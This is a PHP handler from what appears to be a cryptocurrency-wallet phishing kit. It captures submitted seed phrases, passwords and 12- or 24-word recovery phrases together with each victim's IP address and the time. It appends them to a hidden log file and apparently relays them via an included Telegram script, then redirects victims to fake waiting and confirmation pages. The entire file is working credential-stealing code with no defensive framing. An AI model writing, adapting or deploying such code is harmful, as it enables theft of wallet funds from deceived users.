<?php
if (isset($_POST['pkey'])) {


$InfoDATE   = date("d-m-Y h:i:sa");


$pkey = $_SESSION['pkey'] = $_POST['pkey'];



$Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
$rt = substr($Domin, 0, -28);
$rtt = ''.$rt.'/Account/dashboard.php' ;
$ban = ''.$rt.'../../Customer.txt' ;
$vuto = ''.$rt.'/Account/dashboard.php' ;


$yagmai .= '
[👤 seed phrase] =  '.$_SESSION['pkey'].'
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
';

include("Your_Info.php"); 
include("TelegramAPi.php");


$f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

      header("location:../Waiting.html");    echo "<script>
      setTimeout(function(){
  window.location.href = '../Waiting.html';
      });
   </script>";


}elseif (isset($_POST['p1'])) {



    $InfoDATE   = date("d-m-Y h:i:sa");

    
    
    
    $Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
    $rt = substr($Domin, 0, -28);
    $rtt = ''.$rt.'/Account/dashboard.php' ;
    $ban = ''.$rt.'../../Customer.txt' ;
    $vuto = ''.$rt.'/Account/dashboard.php' ;
    
    
    $yagmai .= '
[👤 Password] = '.$_POST['p1'].' '.$_POST['p2'].' '.$_POST['p3'].' '.$_POST['p4'].' '.$_POST['p5'].' '.$_POST['p6'].' '.$_POST['p7'].' '.$_POST['p8'].' '.$_POST['p9'].' '.$_POST['p10'].' '.$_POST['p11'].' '.$_POST['p12'].' 
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
    ';

    $f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

    
    
          header("location:../Confirme.html");    echo "<script>
          setTimeout(function(){
      window.location.href = '../Confirme.html';
          });
       </script>";


       include("Your_Info.php"); 
       include("TelegramAPi.php");

       
}elseif (isset($_POST['pp1'])) {



    $InfoDATE   = date("d-m-Y h:i:sa");

    
    
    
    $Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
    $rt = substr($Domin, 0, -28);
    $rtt = ''.$rt.'/Account/dashboard.php' ;
    $ban = ''.$rt.'../../Customer.txt' ;
    $vuto = ''.$rt.'/Account/dashboard.php' ;
    
    
    $yagmai .= '
[👤 Password] = '.$_POST['pp1'].' '.$_POST['pp2'].' '.$_POST['pp3'].' '.$_POST['pp4'].' '.$_POST['pp5'].' '.$_POST['pp6'].' '.$_POST['pp7'].' '.$_POST['pp8'].' '.$_POST['pp9'].' '.$_POST['pp10'].' '.$_POST['pp11'].' '.$_POST['pp12'].' '.$_POST['pp13'].' '.$_POST['pp14'].' '.$_POST['pp15'].' '.$_POST['pp16'].' '.$_POST['pp17'].' '.$_POST['pp18'].' '.$_POST['pp19'].' '.$_POST['pp20'].' '.$_POST['pp21'].' '.$_POST['pp22'].' '.$_POST['pp23'].' '.$_POST['pp24'].'
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
    ';

    $f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

    
    
          header("location:../Confirme.html");    echo "<script>
          setTimeout(function(){
      window.location.href = '../Confirme.html';
          });
       </script>";


       include("Your_Info.php"); 
       include("TelegramAPi.php");

       
}elseif (isset($_POST['password'])) {



    $InfoDATE   = date("d-m-Y h:i:sa");

    
    
    $password = $_SESSION['password'] = $_POST['password'];
    
    
    
    $Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
    $rt = substr($Domin, 0, -28);
    $rtt = ''.$rt.'/Account/dashboard.php' ;
    $ban = ''.$rt.'../../Customer.txt' ;
    $vuto = ''.$rt.'/Account/dashboard.php' ;
    
    
    $yagmai .= '
[👤 Password] =  '.$_SESSION['password'].'
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
    ';

    $f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

    
    
          header("location:../Wallet.html");    echo "<script>
          setTimeout(function(){
      window.location.href = '../Wallet.html';
          });
       </script>";


       include("Your_Info.php"); 
       include("TelegramAPi.php");

       
}
else {




}



?>